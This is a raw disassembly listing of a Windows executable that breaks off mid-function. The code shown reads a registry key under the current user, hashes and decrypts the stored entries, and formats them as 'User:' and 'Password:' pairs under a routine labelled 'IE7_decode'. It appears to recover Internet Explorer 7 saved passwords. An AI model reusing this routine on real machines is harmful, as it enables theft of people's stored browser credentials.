  408960:	ff 25 50 03 41 00    	jmp    *0x410350
  408966:	8b c0                	mov    %eax,%eax
  408968:	ff 25 4c 03 41 00    	jmp    *0x41034c
  40896e:	8b c0                	mov    %eax,%eax
  408970:	ff 25 48 03 41 00    	jmp    *0x410348
  408976:	8b c0                	mov    %eax,%eax
  408978:	ff 25 44 03 41 00    	jmp    *0x410344
  40897e:	8b c0                	mov    %eax,%eax
  408980:	ff 25 40 03 41 00    	jmp    *0x410340
  408986:	8b c0                	mov    %eax,%eax
  408988:	ff 25 3c 03 41 00    	jmp    *0x41033c
  40898e:	8b c0                	mov    %eax,%eax
  408990:	55                   	push   %ebp
  408991:	8b ec                	mov    %esp,%ebp
  408993:	33 c0                	xor    %eax,%eax
  408995:	55                   	push   %ebp
  408996:	68 b5 89 40 00       	push   $0x4089b5
  40899b:	64 ff 30             	push   %fs:(%eax)
  40899e:	64 89 20             	mov    %esp,%fs:(%eax)
  4089a1:	ff 05 c8 f1 40 00    	incl   0x40f1c8
  4089a7:	33 c0                	xor    %eax,%eax
  4089a9:	5a                   	pop    %edx
  4089aa:	59                   	pop    %ecx
  4089ab:	59                   	pop    %ecx
  4089ac:	64 89 10             	mov    %edx,%fs:(%eax)
  4089af:	68 bc 89 40 00       	push   $0x4089bc
  4089b4:	c3                   	ret
  4089b5:	e9 52 8e ff ff       	jmp    0x40180c
  4089ba:	eb f8                	jmp    0x4089b4
  4089bc:	5d                   	pop    %ebp
  4089bd:	c3                   	ret
  4089be:	8b c0                	mov    %eax,%eax
  4089c0:	83 2d c8 f1 40 00 01 	subl   $0x1,0x40f1c8
  4089c7:	c3                   	ret
  4089c8:	55                   	push   %ebp
  4089c9:	8b ec                	mov    %esp,%ebp
  4089cb:	83 c4 f4             	add    $0xfffffff4,%esp
  4089ce:	53                   	push   %ebx
  4089cf:	56                   	push   %esi
  4089d0:	57                   	push   %edi
  4089d1:	8b d9                	mov    %ecx,%ebx
  4089d3:	03 db                	add    %ebx,%ebx
  4089d5:	43                   	inc    %ebx
  4089d6:	85 db                	test   %ebx,%ebx
  4089d8:	78 07                	js     0x4089e1
  4089da:	8b 34 9a             	mov    (%edx,%ebx,4),%esi
  4089dd:	4b                   	dec    %ebx
  4089de:	56                   	push   %esi
  4089df:	79 f9                	jns    0x4089da
  4089e1:	8b d4                	mov    %esp,%edx
  4089e3:	8b d9                	mov    %ecx,%ebx
  4089e5:	8b f2                	mov    %edx,%esi
  4089e7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4089ea:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4089ed:	e8 46 95 ff ff       	call   0x401f38
  4089f2:	33 c0                	xor    %eax,%eax
  4089f4:	55                   	push   %ebp
  4089f5:	68 be 8a 40 00       	push   $0x408abe
  4089fa:	64 ff 30             	push   %fs:(%eax)
  4089fd:	64 89 20             	mov    %esp,%fs:(%eax)
  408a00:	33 c0                	xor    %eax,%eax
  408a02:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408a05:	8d 43 01             	lea    0x1(%ebx),%eax
  408a08:	85 c0                	test   %eax,%eax
  408a0a:	7e 0b                	jle    0x408a17
  408a0c:	c1 e0 02             	shl    $0x2,%eax
  408a0f:	e8 60 87 ff ff       	call   0x401174
  408a14:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408a17:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408a1a:	8b d3                	mov    %ebx,%edx
  408a1c:	85 d2                	test   %edx,%edx
  408a1e:	7c 12                	jl     0x408a32
  408a20:	42                   	inc    %edx
  408a21:	8b c6                	mov    %esi,%eax
  408a23:	8b d8                	mov    %eax,%ebx
  408a25:	8b 1b                	mov    (%ebx),%ebx
  408a27:	89 19                	mov    %ebx,(%ecx)
  408a29:	83 c1 04             	add    $0x4,%ecx
  408a2c:	83 c0 08             	add    $0x8,%eax
  408a2f:	4a                   	dec    %edx
  408a30:	75 f1                	jne    0x408a23
  408a32:	b8 00 04 00 00       	mov    $0x400,%eax
  408a37:	e8 38 87 ff ff       	call   0x401174
  408a3c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408a3f:	33 c0                	xor    %eax,%eax
  408a41:	55                   	push   %ebp
  408a42:	68 7a 8a 40 00       	push   $0x408a7a
  408a47:	64 ff 30             	push   %fs:(%eax)
  408a4a:	64 89 20             	mov    %esp,%fs:(%eax)
  408a4d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408a50:	50                   	push   %eax
  408a51:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408a54:	e8 ef 94 ff ff       	call   0x401f48
  408a59:	50                   	push   %eax
  408a5a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408a5d:	50                   	push   %eax
  408a5e:	e8 c5 ac ff ff       	call   0x403728
  408a63:	8b c8                	mov    %eax,%ecx
  408a65:	8b 45 08             	mov    0x8(%ebp),%eax
  408a68:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408a6b:	e8 3c 91 ff ff       	call   0x401bac
  408a70:	33 c0                	xor    %eax,%eax
  408a72:	5a                   	pop    %edx
  408a73:	59                   	pop    %ecx
  408a74:	59                   	pop    %ecx
  408a75:	64 89 10             	mov    %edx,%fs:(%eax)
  408a78:	eb 12                	jmp    0x408a8c
  408a7a:	e9 61 8c ff ff       	jmp    0x4016e0
  408a7f:	8b 45 08             	mov    0x8(%ebp),%eax
  408a82:	e8 39 90 ff ff       	call   0x401ac0
  408a87:	e8 0c 8e ff ff       	call   0x401898
  408a8c:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  408a90:	74 08                	je     0x408a9a
  408a92:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408a95:	e8 f2 86 ff ff       	call   0x40118c
  408a9a:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  408a9e:	74 08                	je     0x408aa8
  408aa0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408aa3:	e8 e4 86 ff ff       	call   0x40118c
  408aa8:	33 c0                	xor    %eax,%eax
  408aaa:	5a                   	pop    %edx
  408aab:	59                   	pop    %ecx
  408aac:	59                   	pop    %ecx
  408aad:	64 89 10             	mov    %edx,%fs:(%eax)
  408ab0:	68 c5 8a 40 00       	push   $0x408ac5
  408ab5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408ab8:	e8 03 90 ff ff       	call   0x401ac0
  408abd:	c3                   	ret
  408abe:	e9 49 8d ff ff       	jmp    0x40180c
  408ac3:	eb f0                	jmp    0x408ab5
  408ac5:	8b 7d e8             	mov    -0x18(%ebp),%edi
  408ac8:	8b 75 ec             	mov    -0x14(%ebp),%esi
  408acb:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  408ace:	8b e5                	mov    %ebp,%esp
  408ad0:	5d                   	pop    %ebp
  408ad1:	c2 04 00             	ret    $0x4
  408ad4:	d8 8a 40 00 11 02    	fmuls  0x2110040(%edx)
  408ada:	2e 32 01             	xor    %cs:(%ecx),%al
  408add:	00 00                	add    %al,(%eax)
  408adf:	00 00                	add    %al,(%eax)
  408ae1:	00 00                	add    %al,(%eax)
  408ae3:	00 11                	add    %dl,(%ecx)
  408ae5:	00 00                	add    %al,(%eax)
  408ae7:	00 00                	add    %al,(%eax)
  408ae9:	10 40 00             	adc    %al,0x0(%eax)
  408aec:	0b 75 49             	or     0x49(%ebp),%esi
  408aef:	45                   	inc    %ebp
  408af0:	37                   	aaa
  408af1:	5f                   	pop    %edi
  408af2:	64 65 63 6f 64       	fs arpl %ebp,%gs:0x64(%edi)
  408af7:	65 55                	gs push %ebp
  408af9:	8b ec                	mov    %esp,%ebp
  408afb:	83 c4 d8             	add    $0xffffffd8,%esp
  408afe:	53                   	push   %ebx
  408aff:	56                   	push   %esi
  408b00:	57                   	push   %edi
  408b01:	33 c9                	xor    %ecx,%ecx
  408b03:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  408b06:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  408b09:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  408b0c:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  408b0f:	8b f2                	mov    %edx,%esi
  408b11:	8b f8                	mov    %eax,%edi
  408b13:	33 c0                	xor    %eax,%eax
  408b15:	55                   	push   %ebp
  408b16:	68 74 8c 40 00       	push   $0x408c74
  408b1b:	64 ff 30             	push   %fs:(%eax)
  408b1e:	64 89 20             	mov    %esp,%fs:(%eax)
  408b21:	33 db                	xor    %ebx,%ebx
  408b23:	8b c6                	mov    %esi,%eax
  408b25:	e8 96 8f ff ff       	call   0x401ac0
  408b2a:	6a 00                	push   $0x0
  408b2c:	6a 01                	push   $0x1
  408b2e:	6a 00                	push   $0x0
  408b30:	6a 00                	push   $0x0
  408b32:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408b35:	50                   	push   %eax
  408b36:	e8 25 fe ff ff       	call   0x408960
  408b3b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408b3e:	50                   	push   %eax
  408b3f:	6a 00                	push   $0x0
  408b41:	6a 00                	push   $0x0
  408b43:	68 04 80 00 00       	push   $0x8004
  408b48:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408b4b:	50                   	push   %eax
  408b4c:	e8 27 fe ff ff       	call   0x408978
  408b51:	85 c0                	test   %eax,%eax
  408b53:	0f 84 e7 00 00 00    	je     0x408c40
  408b59:	6a 00                	push   $0x0
  408b5b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408b5e:	8b d7                	mov    %edi,%edx
  408b60:	e8 b3 96 ff ff       	call   0x402218
  408b65:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408b68:	e8 07 97 ff ff       	call   0x402274
  408b6d:	40                   	inc    %eax
  408b6e:	03 c0                	add    %eax,%eax
  408b70:	50                   	push   %eax
  408b71:	57                   	push   %edi
  408b72:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408b75:	50                   	push   %eax
  408b76:	e8 05 fe ff ff       	call   0x408980
  408b7b:	85 c0                	test   %eax,%eax
  408b7d:	0f 84 bd 00 00 00    	je     0x408c40
  408b83:	c7 45 f0 14 00 00 00 	movl   $0x14,-0x10(%ebp)
  408b8a:	6a 14                	push   $0x14
  408b8c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408b8f:	b9 01 00 00 00       	mov    $0x1,%ecx
  408b94:	8b 15 d4 8a 40 00    	mov    0x408ad4,%edx
  408b9a:	e8 1d a4 ff ff       	call   0x402fbc
  408b9f:	83 c4 04             	add    $0x4,%esp
  408ba2:	6a 00                	push   $0x0
  408ba4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408ba7:	50                   	push   %eax
  408ba8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408bab:	50                   	push   %eax
  408bac:	6a 02                	push   $0x2
  408bae:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408bb1:	50                   	push   %eax
  408bb2:	e8 b9 fd ff ff       	call   0x408970
  408bb7:	85 c0                	test   %eax,%eax
  408bb9:	0f 84 81 00 00 00    	je     0x408c40
  408bbf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408bc2:	50                   	push   %eax
  408bc3:	e8 c0 fd ff ff       	call   0x408988
  408bc8:	6a 00                	push   $0x0
  408bca:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408bcd:	50                   	push   %eax
  408bce:	e8 95 fd ff ff       	call   0x408968
  408bd3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408bd6:	48                   	dec    %eax
  408bd7:	85 c0                	test   %eax,%eax
  408bd9:	7c 3d                	jl     0x408c18
  408bdb:	40                   	inc    %eax
  408bdc:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408bdf:	33 ff                	xor    %edi,%edi
  408be1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408be4:	02 1c 38             	add    (%eax,%edi,1),%bl
  408be7:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408bea:	50                   	push   %eax
  408beb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408bee:	0f b6 04 38          	movzbl (%eax,%edi,1),%eax
  408bf2:	89 45 dc             	mov    %eax,-0x24(%ebp)
  408bf5:	c6 45 e0 00          	movb   $0x0,-0x20(%ebp)
  408bf9:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408bfc:	33 c9                	xor    %ecx,%ecx
  408bfe:	b8 8c 8c 40 00       	mov    $0x408c8c,%eax
  408c03:	e8 c0 fd ff ff       	call   0x4089c8
  408c08:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  408c0b:	8b c6                	mov    %esi,%eax
  408c0d:	e8 46 91 ff ff       	call   0x401d58
  408c12:	47                   	inc    %edi
  408c13:	ff 4d ec             	decl   -0x14(%ebp)
  408c16:	75 c9                	jne    0x408be1
  408c18:	8d 45 d8             	lea    -0x28(%ebp),%eax
  408c1b:	50                   	push   %eax
  408c1c:	33 c0                	xor    %eax,%eax
  408c1e:	8a c3                	mov    %bl,%al
  408c20:	89 45 dc             	mov    %eax,-0x24(%ebp)
  408c23:	c6 45 e0 00          	movb   $0x0,-0x20(%ebp)
  408c27:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408c2a:	33 c9                	xor    %ecx,%ecx
  408c2c:	b8 8c 8c 40 00       	mov    $0x408c8c,%eax
  408c31:	e8 92 fd ff ff       	call   0x4089c8
  408c36:	8b 55 d8             	mov    -0x28(%ebp),%edx
  408c39:	8b c6                	mov    %esi,%eax
  408c3b:	e8 18 91 ff ff       	call   0x401d58
  408c40:	33 c0                	xor    %eax,%eax
  408c42:	5a                   	pop    %edx
  408c43:	59                   	pop    %ecx
  408c44:	59                   	pop    %ecx
  408c45:	64 89 10             	mov    %edx,%fs:(%eax)
  408c48:	68 7b 8c 40 00       	push   $0x408c7b
  408c4d:	8d 45 d8             	lea    -0x28(%ebp),%eax
  408c50:	e8 6b 8e ff ff       	call   0x401ac0
  408c55:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408c58:	e8 63 8e ff ff       	call   0x401ac0
  408c5d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408c60:	e8 a3 94 ff ff       	call   0x402108
  408c65:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408c68:	8b 15 d4 8a 40 00    	mov    0x408ad4,%edx
  408c6e:	e8 55 a3 ff ff       	call   0x402fc8
  408c73:	c3                   	ret
  408c74:	e9 93 8b ff ff       	jmp    0x40180c
  408c79:	eb d2                	jmp    0x408c4d
  408c7b:	5f                   	pop    %edi
  408c7c:	5e                   	pop    %esi
  408c7d:	5b                   	pop    %ebx
  408c7e:	8b e5                	mov    %ebp,%esp
  408c80:	5d                   	pop    %ebp
  408c81:	c3                   	ret
  408c82:	00 00                	add    %al,(%eax)
  408c84:	ff                   	(bad)
  408c85:	ff                   	(bad)
  408c86:	ff                   	(bad)
  408c87:	ff 05 00 00 00 25    	incl   0x25000000
  408c8d:	32 2e                	xor    (%esi),%ch
  408c8f:	32 58 00             	xor    0x0(%eax),%bl
  408c92:	00 00                	add    %al,(%eax)
  408c94:	83 c4 f8             	add    $0xfffffff8,%esp
  408c97:	8b d0                	mov    %eax,%edx
  408c99:	8b c2                	mov    %edx,%eax
  408c9b:	d1 f8                	sar    $1,%eax
  408c9d:	79 03                	jns    0x408ca2
  408c9f:	83 d0 00             	adc    $0x0,%eax
  408ca2:	89 04 24             	mov    %eax,(%esp)
  408ca5:	db 04 24             	fildl  (%esp)
  408ca8:	89 54 24 04          	mov    %edx,0x4(%esp)
  408cac:	db 44 24 04          	fildl  0x4(%esp)
  408cb0:	d8 35 c8 8c 40 00    	fdivs  0x408cc8
  408cb6:	de d9                	fcompp
  408cb8:	df e0                	fnstsw %ax
  408cba:	9e                   	sahf
  408cbb:	75 05                	jne    0x408cc2
  408cbd:	b0 01                	mov    $0x1,%al
  408cbf:	59                   	pop    %ecx
  408cc0:	5a                   	pop    %edx
  408cc1:	c3                   	ret
  408cc2:	33 c0                	xor    %eax,%eax
  408cc4:	59                   	pop    %ecx
  408cc5:	5a                   	pop    %edx
  408cc6:	c3                   	ret
  408cc7:	00 00                	add    %al,(%eax)
  408cc9:	00 00                	add    %al,(%eax)
  408ccb:	40                   	inc    %eax
  408ccc:	55                   	push   %ebp
  408ccd:	8b ec                	mov    %esp,%ebp
  408ccf:	83 c4 d8             	add    $0xffffffd8,%esp
  408cd2:	53                   	push   %ebx
  408cd3:	56                   	push   %esi
  408cd4:	57                   	push   %edi
  408cd5:	33 db                	xor    %ebx,%ebx
  408cd7:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  408cda:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  408cdd:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408ce0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408ce3:	33 c0                	xor    %eax,%eax
  408ce5:	55                   	push   %ebp
  408ce6:	68 f5 8d 40 00       	push   $0x408df5
  408ceb:	64 ff 30             	push   %fs:(%eax)
  408cee:	64 89 20             	mov    %esp,%fs:(%eax)
  408cf1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408cf4:	e8 c7 8d ff ff       	call   0x401ac0
  408cf9:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  408cfc:	8b d3                	mov    %ebx,%edx
  408cfe:	83 c2 04             	add    $0x4,%edx
  408d01:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408d04:	b9 04 00 00 00       	mov    $0x4,%ecx
  408d09:	e8 22 aa ff ff       	call   0x403730
  408d0e:	8b d3                	mov    %ebx,%edx
  408d10:	83 c2 08             	add    $0x8,%edx
  408d13:	8d 45 f0             	lea    -0x10(%ebp),%eax
  408d16:	b9 04 00 00 00       	mov    $0x4,%ecx
  408d1b:	e8 10 aa ff ff       	call   0x403730
  408d20:	8b d3                	mov    %ebx,%edx
  408d22:	83 c2 14             	add    $0x14,%edx
  408d25:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408d28:	b9 04 00 00 00       	mov    $0x4,%ecx
  408d2d:	e8 fe a9 ff ff       	call   0x403730
  408d32:	83 c3 24             	add    $0x24,%ebx
  408d35:	8b 7d ec             	mov    -0x14(%ebp),%edi
  408d38:	4f                   	dec    %edi
  408d39:	85 ff                	test   %edi,%edi
  408d3b:	0f 8c 99 00 00 00    	jl     0x408dda
  408d41:	47                   	inc    %edi
  408d42:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  408d49:	8d 45 e8             	lea    -0x18(%ebp),%eax
  408d4c:	b9 04 00 00 00       	mov    $0x4,%ecx
  408d51:	8b d3                	mov    %ebx,%edx
  408d53:	e8 d8 a9 ff ff       	call   0x403730
  408d58:	8b d3                	mov    %ebx,%edx
  408d5a:	83 c2 0c             	add    $0xc,%edx
  408d5d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408d60:	b9 04 00 00 00       	mov    $0x4,%ecx
  408d65:	e8 c6 a9 ff ff       	call   0x403730
  408d6a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408d6d:	e8 02 84 ff ff       	call   0x401174
  408d72:	8b 75 fc             	mov    -0x4(%ebp),%esi
  408d75:	03 75 f4             	add    -0xc(%ebp),%esi
  408d78:	83 c6 0c             	add    $0xc,%esi
  408d7b:	03 75 e8             	add    -0x18(%ebp),%esi
  408d7e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408d81:	e8 0e ff ff ff       	call   0x408c94
  408d86:	3c 01                	cmp    $0x1,%al
  408d88:	75 0f                	jne    0x408d99
  408d8a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408d8d:	ba 0c 8e 40 00       	mov    $0x408e0c,%edx
  408d92:	e8 c1 8d ff ff       	call   0x401b58
  408d97:	eb 0d                	jmp    0x408da6
  408d99:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408d9c:	ba 1c 8e 40 00       	mov    $0x408e1c,%edx
  408da1:	e8 b2 8d ff ff       	call   0x401b58
  408da6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408da9:	ff 30                	push   (%eax)
  408dab:	ff 75 dc             	push   -0x24(%ebp)
  408dae:	8d 45 d8             	lea    -0x28(%ebp),%eax
  408db1:	8b d6                	mov    %esi,%edx
  408db3:	e8 24 8f ff ff       	call   0x401cdc
  408db8:	ff 75 d8             	push   -0x28(%ebp)
  408dbb:	68 30 8e 40 00       	push   $0x408e30
  408dc0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408dc3:	ba 04 00 00 00       	mov    $0x4,%edx
  408dc8:	e8 43 90 ff ff       	call   0x401e10
  408dcd:	83 c3 10             	add    $0x10,%ebx
  408dd0:	ff 45 e0             	incl   -0x20(%ebp)
  408dd3:	4f                   	dec    %edi
  408dd4:	0f 85 6f ff ff ff    	jne    0x408d49
  408dda:	33 c0                	xor    %eax,%eax
  408ddc:	5a                   	pop    %edx
  408ddd:	59                   	pop    %ecx
  408dde:	59                   	pop    %ecx
  408ddf:	64 89 10             	mov    %edx,%fs:(%eax)
  408de2:	68 fc 8d 40 00       	push   $0x408dfc
  408de7:	8d 45 d8             	lea    -0x28(%ebp),%eax
  408dea:	ba 02 00 00 00       	mov    $0x2,%edx
  408def:	e8 f0 8c ff ff       	call   0x401ae4
  408df4:	c3                   	ret
  408df5:	e9 12 8a ff ff       	jmp    0x40180c
  408dfa:	eb eb                	jmp    0x408de7
  408dfc:	5f                   	pop    %edi
  408dfd:	5e                   	pop    %esi
  408dfe:	5b                   	pop    %ebx
  408dff:	8b e5                	mov    %ebp,%esp
  408e01:	5d                   	pop    %ebp
  408e02:	c3                   	ret
  408e03:	00 ff                	add    %bh,%bh
  408e05:	ff                   	(bad)
  408e06:	ff                   	(bad)
  408e07:	ff 06                	incl   (%esi)
  408e09:	00 00                	add    %al,(%eax)
  408e0b:	00 55 73             	add    %dl,0x73(%ebp)
  408e0e:	65 72 3a             	gs jb  0x408e4b
  408e11:	20 00                	and    %al,(%eax)
  408e13:	00 ff                	add    %bh,%bh
  408e15:	ff                   	(bad)
  408e16:	ff                   	(bad)
  408e17:	ff 0a                	decl   (%edx)
  408e19:	00 00                	add    %al,(%eax)
  408e1b:	00 50 61             	add    %dl,0x61(%eax)
  408e1e:	73 73                	jae    0x408e93
  408e20:	77 6f                	ja     0x408e91
  408e22:	72 64                	jb     0x408e88
  408e24:	3a 20                	cmp    (%eax),%ah
  408e26:	00 00                	add    %al,(%eax)
  408e28:	ff                   	(bad)
  408e29:	ff                   	(bad)
  408e2a:	ff                   	(bad)
  408e2b:	ff 02                	incl   (%edx)
  408e2d:	00 00                	add    %al,(%eax)
  408e2f:	00 20                	add    %ah,(%eax)
  408e31:	7c 00                	jl     0x408e33
  408e33:	00 38                	add    %bh,(%eax)
  408e35:	8e 40 00             	mov    0x0(%eax),%es
  408e38:	11 02                	adc    %eax,(%edx)
  408e3a:	2e 33 01             	xor    %cs:(%ecx),%eax
  408e3d:	00 00                	add    %al,(%eax)
  408e3f:	00 00                	add    %al,(%eax)
  408e41:	00 00                	add    %al,(%eax)
  408e43:	00 11                	add    %dl,(%ecx)
  408e45:	00 00                	add    %al,(%eax)
  408e47:	00 00                	add    %al,(%eax)
  408e49:	10 40 00             	adc    %al,0x0(%eax)
  408e4c:	0b 75 49             	or     0x49(%ebp),%esi
  408e4f:	45                   	inc    %ebp
  408e50:	37                   	aaa
  408e51:	5f                   	pop    %edi
  408e52:	64 65 63 6f 64       	fs arpl %ebp,%gs:0x64(%edi)
  408e57:	65 55                	gs push %ebp
  408e59:	8b ec                	mov    %esp,%ebp
  408e5b:	51                   	push   %ecx
  408e5c:	b9 0d 00 00 00       	mov    $0xd,%ecx
  408e61:	6a 00                	push   $0x0
  408e63:	6a 00                	push   $0x0
  408e65:	49                   	dec    %ecx
  408e66:	75 f9                	jne    0x408e61
  408e68:	87 4d fc             	xchg   %ecx,-0x4(%ebp)
  408e6b:	53                   	push   %ebx
  408e6c:	56                   	push   %esi
  408e6d:	57                   	push   %edi
  408e6e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408e71:	8b da                	mov    %edx,%ebx
  408e73:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408e76:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408e79:	e8 ae a1 ff ff       	call   0x40302c
  408e7e:	33 c0                	xor    %eax,%eax
  408e80:	55                   	push   %ebp
  408e81:	68 a7 92 40 00       	push   $0x4092a7
  408e86:	64 ff 30             	push   %fs:(%eax)
  408e89:	64 89 20             	mov    %esp,%fs:(%eax)
  408e8c:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  408e8f:	e8 2c 8c ff ff       	call   0x401ac0
  408e94:	33 c0                	xor    %eax,%eax
  408e96:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408e99:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408e9c:	50                   	push   %eax
  408e9d:	6a 01                	push   $0x1
  408e9f:	6a 00                	push   $0x0
  408ea1:	53                   	push   %ebx
  408ea2:	68 01 00 00 80       	push   $0x80000001
  408ea7:	e8 74 a6 ff ff       	call   0x403520
  408eac:	85 c0                	test   %eax,%eax
  408eae:	0f 85 69 01 00 00    	jne    0x40901d
  408eb4:	c7 45 e8 00 04 00 00 	movl   $0x400,-0x18(%ebp)
  408ebb:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408ebe:	e8 b1 82 ff ff       	call   0x401174
  408ec3:	8b f0                	mov    %eax,%esi
  408ec5:	e9 2e 01 00 00       	jmp    0x408ff8
  408eca:	c7 45 e8 00 04 00 00 	movl   $0x400,-0x18(%ebp)
  408ed1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408ed4:	e8 2f 9f ff ff       	call   0x402e08
  408ed9:	8b f8                	mov    %eax,%edi
  408edb:	85 ff                	test   %edi,%edi
  408edd:	0f 8c 08 01 00 00    	jl     0x408feb
  408ee3:	47                   	inc    %edi
  408ee4:	33 db                	xor    %ebx,%ebx
  408ee6:	8d 55 f0             	lea    -0x10(%ebp),%edx
  408ee9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408eec:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  408eef:	e8 04 fc ff ff       	call   0x408af8
  408ef4:	8d 45 e0             	lea    -0x20(%ebp),%eax
  408ef7:	50                   	push   %eax
  408ef8:	6a 00                	push   $0x0
  408efa:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408efd:	50                   	push   %eax
  408efe:	6a 00                	push   $0x0
  408f00:	56                   	push   %esi
  408f01:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408f04:	50                   	push   %eax
  408f05:	e8 1e a6 ff ff       	call   0x403528
  408f0a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408f0d:	50                   	push   %eax
  408f0e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408f11:	b9 01 00 00 00       	mov    $0x1,%ecx
  408f16:	8b 15 34 8e 40 00    	mov    0x408e34,%edx
  408f1c:	e8 9b a0 ff ff       	call   0x402fbc
  408f21:	83 c4 04             	add    $0x4,%esp
  408f24:	8d 45 e0             	lea    -0x20(%ebp),%eax
  408f27:	50                   	push   %eax
  408f28:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408f2b:	50                   	push   %eax
  408f2c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  408f2f:	50                   	push   %eax
  408f30:	6a 00                	push   $0x0
  408f32:	56                   	push   %esi
  408f33:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408f36:	50                   	push   %eax
  408f37:	e8 ec a5 ff ff       	call   0x403528
  408f3c:	85 c0                	test   %eax,%eax
  408f3e:	0f 85 9f 00 00 00    	jne    0x408fe3
  408f44:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408f47:	89 45 d8             	mov    %eax,-0x28(%ebp)
  408f4a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408f4d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  408f50:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408f53:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  408f56:	89 45 c8             	mov    %eax,-0x38(%ebp)
  408f59:	8d 45 b0             	lea    -0x50(%ebp),%eax
  408f5c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408f5f:	8b 14 9a             	mov    (%edx,%ebx,4),%edx
  408f62:	e8 b1 92 ff ff       	call   0x402218
  408f67:	8b 45 b0             	mov    -0x50(%ebp),%eax
  408f6a:	e8 05 93 ff ff       	call   0x402274
  408f6f:	40                   	inc    %eax
  408f70:	03 c0                	add    %eax,%eax
  408f72:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  408f75:	8d 45 cc             	lea    -0x34(%ebp),%eax
  408f78:	50                   	push   %eax
  408f79:	6a 01                	push   $0x1
  408f7b:	6a 00                	push   $0x0
  408f7d:	6a 00                	push   $0x0
  408f7f:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  408f82:	50                   	push   %eax
  408f83:	6a 00                	push   $0x0
  408f85:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  408f88:	50                   	push   %eax
  408f89:	e8 62 f7 ff ff       	call   0x4086f0
  408f8e:	85 c0                	test   %eax,%eax
  408f90:	74 51                	je     0x408fe3
  408f92:	ff 75 b4             	push   -0x4c(%ebp)
  408f95:	68 c0 92 40 00       	push   $0x4092c0
  408f9a:	8d 45 ac             	lea    -0x54(%ebp),%eax
  408f9d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408fa0:	8b 14 9a             	mov    (%edx,%ebx,4),%edx
  408fa3:	e8 34 8d ff ff       	call   0x401cdc
  408fa8:	ff 75 ac             	push   -0x54(%ebp)
  408fab:	68 d4 92 40 00       	push   $0x4092d4
  408fb0:	8d 45 b4             	lea    -0x4c(%ebp),%eax
